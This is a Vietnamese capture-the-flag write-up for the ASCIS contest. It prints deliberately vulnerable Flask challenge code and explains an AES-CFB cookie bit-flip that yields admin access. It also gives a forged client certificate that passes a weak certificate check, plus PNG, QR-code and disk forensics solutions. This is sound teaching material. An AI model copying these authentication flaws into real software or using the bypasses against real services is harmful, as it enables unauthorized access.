@@ -16,4 +16,1351 @@ categories: ctf
 
 ---  
   
+# Crypto  
   
+## NoOne    
+
+![Screenshot_1](https://user-images.githubusercontent.com/85006768/137721024-907eb5b8-f0c4-4958-b1d4-1e602010f819.jpg)
+  
+Link trên dẫn tới một trang đăng nhập, tiếp tục tạo thử một tài khoản và login.
+![Screenshot_2](https://user-images.githubusercontent.com/85006768/137721104-afdf5be4-b891-4fff-8d80-5e071bc3f64c.jpg)
+![Screenshot_3](https://user-images.githubusercontent.com/85006768/137721109-8d8f3e22-4cbe-4257-b83e-e211a346791e.jpg)
+![Screenshot_4](https://user-images.githubusercontent.com/85006768/137721116-f0501631-cd3b-4617-987e-66ee1bfd813a.jpg)
+
+Trong About có để [source](NoOne/src.txt) của challenge như sau:  
+```python3  
+#!/usr/bin/python3
+
+import base64
+import hashlib
+import sys
+import os
+from Crypto import Random
+from Crypto.Cipher import AES
+from werkzeug.exceptions import abort
+from functools import wraps
+from flask import Flask, render_template, request, url_for, flash, redirect, session, make_response, g
+import mysql.connector
+
+
+DB_HOST = os.getenv("MYSQL_HOST", "xxxxxxx")
+DB_USER = os.getenv("MYSQL_USER", "xxxxxxx") 
+DB_PASS = os.getenv("MYSQL_PASSWORD", "xxxxxxx") 
+DB_NAME = os.getenv("MYSQL_DATABASE", "xxxxxxx") 
+
+
+# input: bytes, output: base64 text
+def encrypt(plainbytes, key):
+    
+    iv = Random.new().read(AES.block_size)
+    
+    cipher = AES.new(key, AES.MODE_CFB, iv)
+    
+    cipherbytes = cipher.encrypt(plainbytes)
+
+    ciphertext = base64.b64encode(iv + cipherbytes)
+
+    return ciphertext
+
+
+# input: base64 text, output: bytes
+def decrypt(ciphertext, key):
+
+    cipherbytes = base64.b64decode(ciphertext)
+
+    iv = cipherbytes[:AES.block_size]
+
+    cipher = AES.new(key, AES.MODE_CFB, iv)
+
+    plainbytes = cipher.decrypt(cipherbytes[AES.block_size:])
+
+    return plainbytes
+
+def get_db_connection():
+    conn = mysql.connector.connect(host = DB_HOST, user = DB_USER, passwd = DB_PASS, database = DB_NAME, auth_plugin='mysql_native_password')
+    conn.autocommit = True
+    return conn
+
+def get_post(post_id):
+    conn = get_db_connection()
+    cur = conn.cursor(dictionary=True)
+    cur.execute('SELECT * FROM posts WHERE id = %s',
+                        (post_id,))
+    post = cur.fetchone()
+    cur.close()
+    conn.close()
+    
+    if post is None:
+        abort(404)
+    return post
+
+def verify_login(username, password):
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('SELECT id, username, password, email, encryptkey, role from users WHERE username = %s AND password = %s',
+                    (username, password))
+    user = cur.fetchone()
+    
+    cur.close()
+    conn.close()
+
+    return user
+
+def do_register(username, password, email, role):
+    key = base64.b64encode(Random.new().read(AES.block_size))
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('INSERT INTO users (username, password, email, role, encryptkey ) VALUES (%s, %s, %s, %s, %s)',
+                    (username, password, email, role, key))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def get_encryptkey(userid):
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('SELECT encryptkey from users WHERE id = %s',
+                    (userid, ))
+    user = cur.fetchone()
+    
+    cur.close()
+    conn.close()
+
+    return base64.b64decode(user[0])
+
+app = Flask(__name__)
+
+app.config['SECRET_KEY'] = 'xxxxxxxxxxxxxxxx'
+
+ROLE_ADMIN = 0
+ROLE_USER = 1
+
+def login_required(f):
+    @wraps(f)
+    def wrap(*args, **kwargs):
+
+        try:
+        
+            ciphertext = request.cookies.get('authtoken')
+
+            userid = request.cookies.get('userid')
+
+            if not ciphertext or not userid:
+                return redirect(url_for('login'))
+
+            encryptkey = get_encryptkey(userid)
+
+            plainbytes = decrypt(ciphertext, encryptkey)
+
+            usernamelen = int.from_bytes(plainbytes[:2], "little")
+            usernameencoded = plainbytes[2:usernamelen+2]
+            username = usernameencoded.decode("utf-8")
+            role = plainbytes[usernamelen+2]
+            
+            g.username = username
+            g.role = role
+
+        except:
+            abort(401)
+        
+        return f(*args, **kwargs)
+   
+    return wrap
+
+
+@app.route("/index")
+@login_required
+def index():
+    conn = get_db_connection()
+    cur = conn.cursor(dictionary=True)
+    cur.execute('SELECT * FROM posts')
+    posts = cur.fetchall()
+    cur.close()
+    conn.close()
+    return render_template('index.html', posts=posts)
+
+@app.route("/flag")
+@login_required
+def flag():
+    flag = "You are not admin"
+    if g.role == ROLE_ADMIN:
+        flag = "xxxxxxxxxxxxxxxxxxxxxxx"
+    return render_template('flag.html', flag=flag)
+
+
+@app.route('/<int:post_id>')
+@login_required
+def post(post_id):
+    post = get_post(post_id)
+    return render_template('post.html', post=post)
+
+@app.route("/about")
+@login_required
+def about():
+    return render_template('about.html')
+
+@app.route("/register", methods=('GET', 'POST'))
+def register():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        email = request.form['email']
+        role = ROLE_USER
+
+        if not username or not password:
+            flash('Username and Password is required!')
+        else:
+            do_register(username, password, email, role)
+
+            return redirect(url_for('login'))
+
+    return render_template('register.html')
+
+
+@app.route("/", methods=('GET', 'POST'))
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+
+        if not username or not password:
+            flash('Username and Password is required!')
+        else:
+            # verify login
+            user = verify_login(username, password)
+
+            if not user:
+                flash('Username and Password is not correct!')
+            else:
+                
+                userid = user[0]
+                username = user[1]
+                role = user[5]
+
+                # get key
+                key = base64.b64decode(user[4])
+
+                # create authtoken
+                usernamebytes = username.encode('utf-8')
+                usernamelen = len(usernamebytes)
+                plainbytes = len(usernamebytes).to_bytes(2, "little") + usernamebytes + role.to_bytes(1, "little")
+
+                ciphertext = encrypt(plainbytes, key)
+
+                response = make_response(redirect(url_for('index')))
+
+                response.set_cookie('userid', str(userid))
+                response.set_cookie('authtoken', ciphertext)
+
+                return response
+
+    return render_template('login.html')
+
+@app.route("/logout")
+def logout():
+    response = make_response(redirect(url_for('index')))
+
+    response.set_cookie('userid', '0', expires=0)
+    response.set_cookie('authtoken', '', expires=0)
+
+    return response
+
+app.run(host="0.0.0.0", port=8080, debug=False)
+```
+và sau khi phân tích source mình sẽ rút ra được:
+
+- User được chia làm hai loại, user thường và admin, trong đó `ROLE_ADMIN = 0; ROLE_USER = 1`. Để lấy được flag, mình phải là admin (request tới /flag).
+- Ở login(), authtoken được tạo bằng `AES_CFB[len(usernamebytes).to_bytes(2, "little") + usernamebytes + role.to_bytes(1, "little")]`. Reference: [Wikipedia - Cipher feedback (CFB)](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB)).
+
+![Screenshot_5](https://user-images.githubusercontent.com/85006768/137721239-5eed7318-38aa-4c34-bfa6-e9ba1a6d2be7.jpg)
+
+- Như vậy, chỉ cần flip role từ 1 thành 0 là mình sẽ trở thành admin.
+
+![Screenshot_6](https://user-images.githubusercontent.com/85006768/137721291-3daa2a1d-53b7-469f-8e7e-656d39daba94.jpg)
+![Screenshot_7](https://user-images.githubusercontent.com/85006768/137721295-37f40175-7706-43e9-b1b1-4898c93e21e4.jpg)
+
+> Flag: `ASCIS{z3r0_l0g0n_1s_H3re}`
+
+***
+
+## EasyOne
+  
+![Screenshot_1](https://user-images.githubusercontent.com/85006768/137721362-6ae1b303-9603-4fd3-ae7e-094495777e46.jpg)
+
+Cũng tương tự như bài NoOne, tác giả cho [source](EasyOne/src.txt) của challenge nằm ở /about.  
+```python3  
+------------------------- app.py -------------------------------------------------
+#!/usr/bin/python3
+
+import base64
+import hashlib
+from logging import NullHandler, root
+import sys
+import os
+from Crypto import Random
+from Crypto.Cipher import AES
+from werkzeug.exceptions import abort
+from functools import wraps
+from flask import Flask, render_template, request, url_for, flash, redirect, session, make_response, g
+import mysql.connector
+import werkzeug
+import ssl
+import OpenSSL
+from OpenSSL import crypto
+from certutils import CertInfo, verify_certificate_chain
+
+
+DB_HOST = os.getenv("MYSQL_HOST", "xxxxxx")
+DB_USER = os.getenv("MYSQL_USER", "xxxxxx") 
+DB_PASS = os.getenv("MYSQL_PASSWORD", "xxxxxx") 
+DB_NAME = os.getenv("MYSQL_DATABASE", "xxxxxx") 
+
+
+def get_db_connection():
+    conn = mysql.connector.connect(host = DB_HOST, user = DB_USER, passwd = DB_PASS, database = DB_NAME, auth_plugin='mysql_native_password')
+    conn.autocommit = True
+    return conn
+
+def get_post(post_id):
+    conn = get_db_connection()
+    cur = conn.cursor(dictionary=True)
+    cur.execute('SELECT * FROM posts WHERE id = %s',
+                        (post_id,))
+    post = cur.fetchone()
+    cur.close()
+    conn.close()
+    
+    if post is None:
+        abort(404)
+    return post
+
+def verify_login(username, password):
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('SELECT id, username, password, email, role from users WHERE username = %s AND password = %s',
+                    (username, password))
+    user = cur.fetchone()
+    
+    cur.close()
+    conn.close()
+
+    return user
+
+def do_register(username, password, email, role):
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('INSERT INTO users (username, password, email, role) VALUES (%s, %s, %s, %s)',
+                    (username, password, email, role))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+
+
+def validate_certificate(file):
+    
+    trusted_certs = ['./ca.crt', './app.crt']
+
+    for root_cert in trusted_certs:
+        if not os.path.isfile(root_cert):
+            raise Exception("Cannot found root certs")
+
+    clientcert = file.stream.read()
+
+    return verify_certificate_chain(clientcert, trusted_certs)
+
+
+app = Flask(__name__)
+
+app.config['SECRET_KEY'] = 'xxxxxxxxxxxxxxxx'
+
+ROLE_ADMIN = 0
+ROLE_USER = 1
+
+def login_required(f):
+    @wraps(f)
+    def wrap(*args, **kwargs):
+
+        try:
+            if "username" not in session or session["username"] == "" or session["username"] is None:
+                abort(401)
+            print(session["username"])
+        except:
+            abort(401)
+        
+        return f(*args, **kwargs)
+   
+    return wrap
+
+
+@app.route("/index")
+@login_required
+def index():
+    conn = get_db_connection()
+    cur = conn.cursor(dictionary=True)
+    cur.execute('SELECT * FROM posts')
+    posts = cur.fetchall()
+    cur.close()
+    conn.close()
+    return render_template('index.html', posts=posts)
+
+@app.route("/flag")
+@login_required
+def flag():
+    flag = "You are not admin"
+    if session["role"] == ROLE_ADMIN:
+        flag = "ASCIS{xxxxxx}"
+    return render_template('flag.html', flag=flag)
+
+
+@app.route('/<int:post_id>')
+@login_required
+def post(post_id):
+    post = get_post(post_id)
+    return render_template('post.html', post=post)
+
+@app.route("/about")
+@login_required
+def about():
+    return render_template('about.html')
+
+@app.route("/register", methods=('GET', 'POST'))
+def register():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        email = request.form['email']
+        role = ROLE_USER
+
+        if not username or not password:
+            flash('Username and Password is required!')
+        else:
+            do_register(username, password, email, role)
+
+            return redirect(url_for('login'))
+
+    return render_template('register.html')
+
+
+@app.route("/", methods=('GET', 'POST'))
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+
+        if not username or not password:
+            flash('Username and Password is required!')
+        else:
+            # verify login
+            user = verify_login(username, password)
+
+            if not user:
+                flash('Username and Password is not correct!')
+            else:
+                session["username"] = user[1]
+                session["role"] = user[4]
+
+                return redirect(url_for('index'))
+
+    return render_template('login.html')
+
+# This function only for admin
+@app.route("/logincert", methods=('GET', 'POST'))
+def logincert():
+    if request.method == 'POST':
+        username = None
+        uploaded_file = request.files['file']
+        if uploaded_file.filename != '':
+            split_tup = os.path.splitext(uploaded_file.filename)
+            if split_tup[1] != ".pem":
+                flash('Cert file is invalid')
+                return render_template('logincert.html')
+            else:    
+                username = validate_certificate(uploaded_file)
+
+        if username is None:
+            flash('Login cert is invalid!')
+            return render_template('logincert.html')
+        else:    
+            session["username"] = username
+            session["role"] = ROLE_ADMIN
+
+            return redirect(url_for('index'))
+
+    return render_template('logincert.html')
+
+@app.route("/logout")
+def logout():
+    session["username"] = None
+    session["role"] = None
+    session.clear()
+    return redirect(url_for('login'))
+
+app.run(host="0.0.0.0", port=8100, debug=False)
+----------------------------------------------------- certutils.py ------------------------------------------------------------
+import base64
+import hashlib
+from logging import NullHandler, root
+import sys
+import os
+from Crypto import Random
+from Crypto.Cipher import AES
+from werkzeug.exceptions import abort
+from functools import wraps
+from flask import Flask, render_template, request, url_for, flash, redirect, session, make_response, g
+import mysql.connector
+import werkzeug
+import ssl
+import OpenSSL
+from OpenSSL import crypto
+import datetime
+
+class CertInfo:
+    
+    def __init__(
+        self,
+        cert=None,
+        ):
+        self.cert = cert
+    def decode_x509name_obj(self, o):
+        parts = []
+        for c in o.get_components():
+            parts.append(c[0].decode('utf-8') + '=' + c[1].decode('utf-8'))
+        return ', '.join(parts)
+    def cert_date_to_gmt_date(self, d):
+        return datetime.datetime.strptime(d.decode('ascii'), '%Y%m%d%H%M%SZ')
+    def cert_date_to_gmt_date_string(self, d):
+        return self.cert_date_to_gmt_date(d).strftime("%Y-%m-%d %H:%M:%S GMT")
+    def get_item(self, item, extension=None, return_as=None, algo=None):
+        try:
+            if item == 'subject':
+                return self.decode_x509name_obj(self.cert.get_subject())
+
+            elif item == 'subject_o':
+                return self.cert.get_subject().O.strip()
+
+            elif item == 'subject_cn':
+                return self.cert.get_subject().CN.strip()
+
+            elif item == 'extensions':
+                ext_count = self.cert.get_extension_count()
+                if extension is None:
+                    ext_infos = []
+                    for i in range (0, ext_count):
+                        ext = self.cert.get_extension(i)
+                        ext_infos.append(ext.get_short_name().decode('utf-8'))
+                    return ext_infos
+
+                for i in range (0, ext_count):
+                    ext = self.cert.get_extension(i)
+                    if extension in str(ext.get_short_name()):
+                        return ext.__str__().strip()
+                return None
+
+            elif item == 'version':
+                return self.cert.get_version()
+
+            elif item == 'pubkey_type':
+                pk_type = self.cert.get_pubkey().type()
+                if pk_type == crypto.TYPE_RSA:
+                    return 'RSA'
+                elif pk_type == crypto.TYPE_DSA:
+                    return 'DSA'
+                return 'Unknown'
+
+            elif item == 'pubkey_pem':
+                return crypto.dump_publickey(crypto.FILETYPE_PEM, self.cert.get_pubkey()).decode('utf-8')
+
+            elif item == 'serial_number':
+                return self.cert.get_serial_number()
+
+            elif item == 'not_before':
+                not_before = self.cert.get_notBefore()
+                if return_as == 'string':
+                    return self.cert_date_to_gmt_date_string(not_before)
+                return self.cert_date_to_gmt_date(not_before)
+
+            elif item == 'not_after':
+                not_after = self.cert.get_notAfter()
+                if return_as == 'string':
+                    return self.cert_date_to_gmt_date_string(not_after)
+                return self.cert_date_to_gmt_date(not_after)
+
+            elif item == 'has_expired':
+                return self.cert.has_expired()
+
+            elif item == 'issuer':
+                return self.decode_x509name_obj(self.cert.get_issuer())
+
+            elif item == 'issuer_o':
+                return self.cert.get_issuer().O.strip()
+
+            elif item == 'issuer_cn':
+                return self.cert.get_issuer().CN.strip()
+
+            elif item == 'signature_algorithm':
+                return self.cert.get_signature_algorithm().decode('utf-8')
+
+            elif item == 'digest':
+                # ['md5', 'sha1', 'sha256', 'sha512']
+                return self.cert.digest(algo)
+
+            elif item == 'pem':
+                return crypto.dump_certificate(crypto.FILETYPE_PEM, self.cert).decode('utf-8')
+
+            else:
+                return None
+
+        except Exception as e:
+            # logger.error('item = {}, exception, e = {}'.format(item, e))
+            return None
+    @property
+    def subject(self):
+        return self.get_item('subject')
+    @property
+    def subject_o(self):
+        return self.get_item('subject_o')
+    @property
+    def subject_cn(self):
+        return self.get_item('subject_cn')
+    @property
+    def subject_name_hash(self):
+        return self.get_item('subject_name_hash')
+    @property
+    def extension_count(self):
+        return self.get_item('extension_count')
+    @property
+    def extensions(self):
+        return self.get_item('extensions')
+    @property
+    def extension_basic_constraints(self):
+        return self.get_item('extensions', extension='basicConstraints')
+    @property
+    def extension_subject_key_identifier(self):
+        return self.get_item('extensions', extension='subjectKeyIdentifier')
+    @property
+    def extension_authority_key_identifier(self):
+        return self.get_item('extensions', extension='authorityKeyIdentifier')
+    @property
+    def extension_subject_alt_name(self):
+        return self.get_item('extensions', extension='subjectAltName')
+    @property
+    def version(self):
+        return self.get_item('version')
+    @property
+    def pubkey_type(self):
+        return self.get_item('pubkey_type')
+    @property
+    def pubkey_pem(self):
+        return self.get_item('pubkey_pem')
+    @property
+    def serial_number(self):
+        return self.get_item('serial_number')
+    @property
+    def not_before(self):
+        return self.get_item('not_before')
+    @property
+    def not_before_s(self):
+        return self.get_item('not_before', return_as='string')
+    @property
+    def not_after(self):
+        return self.get_item('not_after')
+    @property
+    def not_after_s(self):
+        return self.get_item('not_after', return_as='string')
+    @property
+    def has_expired(self):
+        return self.get_item('has_expired')
+    @property
+    def issuer(self):
+        return self.get_item('issuer')
+    @property
+    def issuer_o(self):
+        return self.get_item('issuer_o')
+    @property
+    def issuer_cn(self):
+        return self.get_item('issuer_cn')
+    @property
+    def signature_algorithm(self):
+        return self.get_item('signature_algorithm')
+    @property
+    def digest_sha256(self):
+        return self.get_item('digest', algo='sha256')
+    @property
+    def pem(self):
+        return self.get_item('pem')
+
+
+def verify_certificate_chain(cert_pem, trusted_certs):
+    certificate = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
+    # parse ceritificate information
+    clientcert = CertInfo(certificate)
+    # get subject common name
+    subject = clientcert.subject_cn
+    issuer = clientcert.issuer_cn
+    # Check if subject is admin user
+    if subject != "admin":
+        raise Exception("Not trusted user")
+    # validate issuer 
+    if issuer != "ca":
+        raise Exception("Not trusted ca")
+    thumbprint = clientcert.digest_sha256.decode('utf-8')
+    #TODO: validate thumbprint
+    #Create a certificate store and add your trusted certs
+    try:
+        store = crypto.X509Store()
+        # Assuming the certificates are in PEM format in a trusted_certs list
+        for _cert in trusted_certs:
+            cert_file = open(_cert, 'r')
+            cert_data = cert_file.read()
+            client_certificate = crypto.load_certificate(crypto.FILETYPE_PEM, cert_data)
+            store.add_cert(client_certificate)
+        # Create a certificate context using the store 
+        store_ctx = crypto.X509StoreContext(store, certificate)
+        # Verify the certificate signature, returns None if it can validate the certificate
+        store_ctx.verify_certificate()
+        # verify success
+        return subject
+    except Exception as e:
+        print("[+] Debug certificate validation failed")
+        return False  
+ ```  
+![Screenshot_2](https://user-images.githubusercontent.com/85006768/137721428-4e979207-7df1-45fd-9025-baf2a43f001c.jpg)
+![Screenshot_3](https://user-images.githubusercontent.com/85006768/137721430-3bc5fe7a-a823-4a0a-b783-5d9b5a438bc6.jpg)
+![Screenshot_4](https://user-images.githubusercontent.com/85006768/137721433-b9d3df52-da7f-4842-b98c-4835c12991ad.jpg)
+
+Một điểm lưu ý, trong source code có một func dùng để login bằng certificate (/logincert), khi login theo cách này mặc định sẽ có role là admin.
+
+![Screenshot_5](https://user-images.githubusercontent.com/85006768/137721453-30045753-4a8d-41a2-b749-5b4bc52fb3c3.jpg)
+![Screenshot_8](https://user-images.githubusercontent.com/85006768/137721465-927bfb0e-2449-476f-acbc-fb013a9ea3ee.jpg)
+
+Quay ngược lại phân tích validate_certificate() và verify_certificate_chain(), như vậy mình cần phải tạo một X.509 certificate (.pem), với `subject_cn == "admin"` và `issuer_cn == "ca"`.  
+  
+  
+![Screenshot_6](https://user-images.githubusercontent.com/85006768/137721479-7acb5239-f6aa-4313-8aa9-acec28b19823.jpg)
+![Screenshot_7](https://user-images.githubusercontent.com/85006768/137721484-c0c5cfcd-9a71-45d4-a8dd-90c34b5e0df0.jpg)
+
+References: 
+- [Wikipedia - Self-signed certificate](https://en.wikipedia.org/wiki/Self-signed_certificate)
+- [Wikipedia - Certificate authority](https://en.wikipedia.org/wiki/Certificate_authority)
+- [workaround.org - Create CA](https://workaround.org/certificate-authority/)
+
+[sol.pem](EasyOne/sol.pem)
+```
+-----BEGIN CERTIFICATE-----
+MIIDyjCCArKgAwIBAgIUdsrsPaMxa2TR/iSRJSCjg1hfIJAwDQYJKoZIhvcNAQEL
+BQAwVDELMAkGA1UEBhMCVk4xCzAJBgNVBAgMAlZOMQswCQYDVQQKDAJjYTELMAkG
+A1UECwwCY2ExCzAJBgNVBAMMAmNhMREwDwYJKoZIhvcNAQkBFgJjYTAeFw0yMTEw
+MTYwNzUwMzFaFw0yMjEwMTYwNzUwMzFaMG0xCzAJBgNVBAYTAlZOMQswCQYDVQQI
+DAJWTjELMAkGA1UEBwwCVk4xDjAMBgNVBAoMBWFkbWluMQ4wDAYDVQQLDAVhZG1p
+bjEOMAwGA1UEAwwFYWRtaW4xFDASBgkqhkiG9w0BCQEWBWFkbWluMIIBIjANBgkq
+hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw4bl8OUVKvhD5F+laZMF/7u9X0LS4Tb2
+uSb5pSGkVmbYMNKzWZX7QLiPTF1OpGlzXLHKhxaVcTqrpkaqu3JqtylznKl6nFTA
+KC6gBfLmNOmuPZ3X1+HYPdWgQN1H8mIRLrqu9KD9G5EEXEU+7UWmBgB9P9fczCGR
+OfErffdmnqG0TDlD7Fk+oaWEHrGrMeOHBQcl5/Jso47nOqx2dPg8hXwW2I3gyeGD
+DZRVZOk34wml8+awj6O+NdT/8Hs+YMNrVeGJbmhygZN9B34qH/C0IT7hIzImR2rc
+4Nq5fVVwKxf3qOlW/eHhu6R0lqjTXmqtdMhh3BRkELcwr4V4iFc2mQIDAQABo3sw
+eTAJBgNVHRMEAjAAMCwGCWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBD
+ZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQUOkN+wHxnnVkZmXJl9iTXPHUSsygwHwYDVR0j
+BBgwFoAUHtyzAugem8DTqS2AhZFr/4AOOFQwDQYJKoZIhvcNAQELBQADggEBAH+5
+hZoyjXa20weLwrH/sYY+PUC0nQYVtGuz20ihJQdh9t+4meKjCSlOlD8dmOA/1Tph
+gZ/sNEzSkxvt5WBHI7cCgtIB0CcsWQCKKxKJ5NQIYTydymepE4z+dYgkrAliAcMv
+4Is48U84YFxljbCmVYKC4PXK5E66aqtgMEMV9lopC07+ybOs5L9EPo36mlqgrmVX
+0vo0g3H506tBDviJRRMJ8UVEQaFWJxh6PbHBYpEpGwQPJRLrVla1iL4FsCn9wCWn
+cv9uIOrhuHjof3lplMM0m9Jiv+cFPvYR+MWpWSfKyJVHqPoU5+J9+xeIIYrkzFzM
+sSenSnMvDt6dPFj6Vl8=
+-----END CERTIFICATE-----
+```
+
+Login bằng certificate thành công, vào lấy flag và submit thôi.
+
+
+![Screenshot_9](https://user-images.githubusercontent.com/85006768/137721520-b55b0998-ae76-41a6-9d11-4f9ec3c364da.jpg)
+![Screenshot_10](https://user-images.githubusercontent.com/85006768/137721532-e693ef01-38fc-4c0f-80c5-c59059b306a5.jpg)
+
+> Flag: `ASCIS{c3rt_val1dat1on_s1mpl3}`  
+
+# Misc  
+  
+## PNG
+
+Bước 1. Sử dụng `pngcheck` kiểm tra ảnh và biết ảnh đang bị lỗi các byte CRC
+
+```
+vcs.png  CRC error in chunk IHDR (computed 3d4d4a61, expected b018483d)
+ERROR: vcs.png
+```
+
+Dùng trình chỉnh mã hex bất kì, chỉnh lại giá trị CRC `3d4d4a61` thành `b018483d`.
+
+Bước 2. Cờ được giấu ở phía cuối ảnh, có thể sử dụng [fotoforensic](https://fotoforensics.com/) để xem các hidden pixel và lấy được cờ.
+
+Ngoài ra giải thích thêm hidden pixel có là vì chiều cao ảnh bị chỉnh khác lại so với ảnh gốc, làm mất đi phần nội dung cuối góc ảnh. Bạn có thể tham khảo [PNG (Portable Network Graphics) Specification](https://www.w3.org/TR/PNG-Chunks.html) tính toán vị trí hex code của chiều cao và chiều rộng và thay đổi trực tiếp.  
+  
+## travel paper
+![image](https://user-images.githubusercontent.com/41907864/137715825-2d3a6567-f575-4fa4-993f-0ee0d1f078d8.png)
+
+Sau khi kết nối `nc` thì nhận được `QR code` được vẽ ra bằng các kí tự đặc biệt trên console như sau:
+![image](https://user-images.githubusercontent.com/41907864/137716035-f04fb83b-6671-4733-b4cc-8b8fe00bb591.png)
+
+Sau khi thử decode `QR code` này bằng cơm thì thu được kết quả có dạng như sau: `682584872|Nguyen Tuan Thanh|14/11/2021`. Ta dễ dàng có thể đoán được dữ liệu tương ứng là:
+
+- `ID Number`: 682584872
+- `Full Name`: Nguyen Tuan Thanh
+- `Expired Date`: 14/11/2021
+
+Sau khi mình submit thông tin lên thì tiếp tục nhận được 1 `QR code` khác.... hmmm vậy là mình quyết định sẽ code 1 script tự động nhận dữ liệu, decode `QR code` và gửi thông tin decode được lên server.
+
+Ý tưởng của mình là sẽ phải convert được dạng QR code bằng kí tự đặc biệt kia về các pixel tương ứng với 0 và 1, sau đó sử dụng thư viện `QR code decode` để lấy data và gửi lên server.
+
+Sau khi mở các kí tự đặc biệt tạo `QR code` bằng sublime text mình nhận ra có 3 loại kí tự đặc biệt: █  ▄  ▀
+Mình nhận thấy mỗi kí tự này sẽ chiếm 2 dòng pixel (nếu coi QR code là 1 hình). Công việc bây giờ đơn giản là sẽ map 3 kí tự này tương ứng với data trong matrix như sau:
+
+  █ =>  `1
+             1`
+
+  ▄ =>  `0
+             1`
+
+  ▀ =>  `1
+            0`
+
+Sau khi tạo ra được matrix pixel để tạo hình tương ứng thì mình vẫn chưa decode bằng thư viện `pyzbar` được nên mình đã thử resize hình lên `300x300` và đã decode được, cuối cùng là viết script tự động như dưới đây:
+
+```python3
+from pwn import *
+from PIL import Image
+import numpy as np
+from pyzbar import pyzbar
+
+r = remote('125.235.240.166', 20123)
+for round_index in range(1, 101):
+    print(r.recvuntil(f'Person #{round_index}:\n'))
+    qr_content = r.recvuntil('ID Number: ').strip(b'\nID Number: ')
+    print(qr_content.decode())
+    qr_content = qr_content.replace(bytes(qr_content[:2]), b' ')
+
+    list_line = qr_content.split(b'\n')
+    list_line = list_line[2:-2]
+
+    matrix = []
+    index = 0
+    for line in list_line:
+        line = line[4:-4].replace(b' ', b'\x00\x00\x00')
+        matrix.append([0] * (len(line) // 3))
+        matrix.append([0] * (len(line) // 3))
+        for i in range((len(line) // 3)):
+            if line[3*i:3*i+3] == b'\x00\x00\x00':
+                matrix[index][i] = 0
+                matrix[index+1][i] = 0
+            elif line[3*i:3*i+3] == b'\xe2\x96\x88':
+                matrix[index][i] = 1
+                matrix[index+1][i] = 1
+            elif line[3*i:3*i+3] == b'\xe2\x96\x80':
+                matrix[index][i] = 1
+                matrix[index+1][i] = 0
+            elif line[3*i:3*i+3] == b'\xe2\x96\x84':
+                matrix[index][i] = 0
+                matrix[index+1][i] = 1
+            else:
+                matrix[index][i] = -1
+                matrix[index+1][i] = -1
+            
+        index += 2
+
+    pixels = []
+    for i in range(len(matrix)):
+        line = matrix[i]
+        pixels.append([0] * len(line))
+        for j in range(len(line)):
+            data = line[j]
+            if data == 0:
+                pixels[i][j] = (255, 255, 255)
+            else:
+                pixels[i][j] = (0, 0, 0)
+    # print(pixels)
+
+    # Convert the pixels into an array using numpy
+    array = np.array(pixels, dtype=np.uint8)
+    # Use PIL to create an image from the new array of pixels
+    new_image = Image.fromarray(array)
+    new_image = new_image.resize((300,300))
+    # new_image.save('new.png')
+
+    # print(image)
+    barcodes = pyzbar.decode(new_image)
+    for barcode in barcodes:
+        qrcode_data = barcode.data
+        r.sendline(qrcode_data.split(b'|')[0].strip())
+        print(r.recvuntil('Full Name:'))
+        r.sendline(qrcode_data.split(b'|')[1].strip())
+        print(r.recvuntil('Expired Date:'))
+        r.sendline(qrcode_data.split(b'|')[2].strip())
+        print(r.recvuntil('Correct!\n'))
+        break
+r.interactive()
+```
+
+> Flag: ASCIS{c0r0n4_v1rus_1s_g0n3} 
+  
+## Sherlock Homes
+
+Nhận được tệp có phần mở rộng tập tin là VHDX.
+
+![image](https://user-images.githubusercontent.com/32236617/137692521-b9a34505-7adb-4248-8ef2-06276c17dec0.png)
+
+Phần mở rộng của tệp tin là [VHDX](https://www.techopedia.com/definition/29319/hyper-v-virtual-hard-disk-vhdx) là định dạng tệp ảnh đĩa được xem như là một ổ cứng thực,vật lý nhưng được lưu trữ trong một tệp duy nhất nằm *trên* một đĩa vật lý giống như một ổ đĩa cứng.
+
+Có một số cách để phân tích tệp này như sử dụng [autopsy](https://www.autopsy.com/) hoặc [mount](https://askubuntu.com/questions/1088411/mount-vdhx-image-on-ubuntu-data-recovery) trực tiếp ổ này vào máy tính rồi dùng cách cú pháp dòng lệnh để phân tích. Mình sẽ gợi ý theo cách [mount](https://askubuntu.com/questions/1088411/mount-vdhx-image-on-ubuntu-data-recovery) trực tiếp, sau khi làm theo hướng dẫn trong đường dẫn đính kèm thì giờ có thể trực tiếp truy xuất các dữ liệu trong ổ đĩa.
+
+Thông thường thì bước đầu cứ `grep -rn "flag"` hoặc `grep -rn "ascis{"` xem thử có gì liên quan không.
+
+![image](https://user-images.githubusercontent.com/32236617/137688238-88a7de28-4467-4295-97e8-464c7c5ffed1.png)
+
+Trường hợp không có thì hãy thử truy vết các tệp được tạo, chỉnh sửa gần đây bằng lệnh `find` .
+
+Với lệnh trên thì tìm ra vài thông tin khả nghi như
+
+```
+C:\Users\John\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
+D:\Setup\Log\C\Users\John\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
+C/Users/John/AppData/Local/ConnectedDevicesPlatform/L.John/ActivitiesCache.db
+```
+
+Đọc tệp `C/Users/John/AppData/Local/ConnectedDevicesPlatform/L.John/ActivitiesCache.db` thì có các nội dung như sau:
+
+![image](https://user-images.githubusercontent.com/32236617/137689766-b070535e-cbd9-4ed6-9c40-87e83bcaa244.png)
+
+Có chứa `ASCIS{NTF$_!S_G00D}` đúng với định dạng của cờ, sau khi submit thì nhận được thông báo cờ sai. Có trao đổi với phía BTC thì nhận được thông tin là cờ giả. Tiếp tục đào các dữ kiện khác.
+
